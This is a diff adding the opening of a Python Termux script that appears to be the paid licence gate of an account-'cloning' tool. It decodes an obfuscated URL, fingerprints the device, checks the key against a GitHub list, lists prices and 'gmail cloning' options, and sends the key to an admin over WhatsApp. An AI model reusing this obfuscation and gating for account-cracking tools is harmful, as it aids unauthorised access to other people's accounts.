@@ -1,0 +1,93 @@
+r="\033[1;91m"
+g="\033[1;92m"
+y="\033[1;93m"
+b="\033[1;94m"
+p="\033[1;95m"
+c="\033[1;96m"
+l="\033[1;97m"
+s="\033[0m"
+#--(light@Colours)---#
+lr="\033[0;91m"
+lg="\033[0;92m"
+ly="\033[0;93m"
+lb="\033[0;94m"
+lp="\033[0;95m"
+lc="\033[0;96m"
+ll="\033[0;97m"
+#--(rare-colors)--#
+holaa="38;5"
+ro=(f"\033[{holaa};208")
+rb=(f"\033[{holaa};32")
+rc=(f"\033[{holaa};122m")
+rg= (f"\033[{holaa};112m")
+rp=(f"\033[{holaa};147m")
+
+loop = 0
+methods = []
+ok=[]
+total=[]
+clone_type=[]
+android_models = []
+
+xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')
+update = requests.get(xny).text
+uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
+id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
+plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
+xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+bxd = ""
+bumper = id+bxd+xp
+myweb2 = requests.get('https://github.com/SKBER-CYBER/Green-Lover/blob/main/Lover.txt').text
+
+def qsbuy():
+        try:
+                os.system('clear')
+                print(logo)
+                x = requests.get('https://github.com/SKBER-CYBER/Green-Lover/blob/main/Lover.txt').text
+                if str("upppdate") in update:
+                        os.system('clear')
+                        exit('script is in update / maintanance be patient ')
+                elif str("res-sseett") in update:
+                        os.system('')
+                        os.system('')
+                        os.system('')
+                        exit('Dont Try To Bypass')
+                elif bumper in myweb2:
+                        main()
+                else:
+                        os.system("clear");print(logo)
+                        print(f"{lr}   Your Device License Key Is Not Approved{s}")
+                        print(50*"-")
+                        print(f"{rc} Key : {bumper}{s}")
+                        print(50*"-")
+                        #print(f" Note : Tool is Paid")
+                      #  print("\n  ")
+                        print(50*"-")
+                        print(f"{rc}15-Days Price : 350")
+                        print(f"{rc}1-Month Price : 500")
+                        print(50*"-")
+                        print (f"{rc}Massage : Your Key Not Registered")
+                        print(50*"-")
+                        print(f"{rc}Your Key Not Registered")
+                        print(50*"-")
+                        print(f"{rc}Note: If You Are Free User Dont Come IB")
+                        print(50*"-")
+                        print(f"{rc}  [•] File cloning\n  [•] Random cloning\n  [•] gmail cloning \n  [•] join whatsap group \n  [•] Exit menu \n  [1] Upgrade Tool To")
+                        print(50*"-")
+                        input(" Choose Option : ")
+                        input("[Press Enter To Send Key To Admin]")
+                        os.system(f"termux-open-url https://wa.me/+8801917466867?text={bumper}")
+                        qsbuy()
+        except requests.exceptions.ConnectionError:
+                exit(' No internet connection ..')
+
+def rrrr():
+        if bumper in myweb2:
+                pass
+        else:
+                qsbuy()
+                
+                
+                
+                
+                   
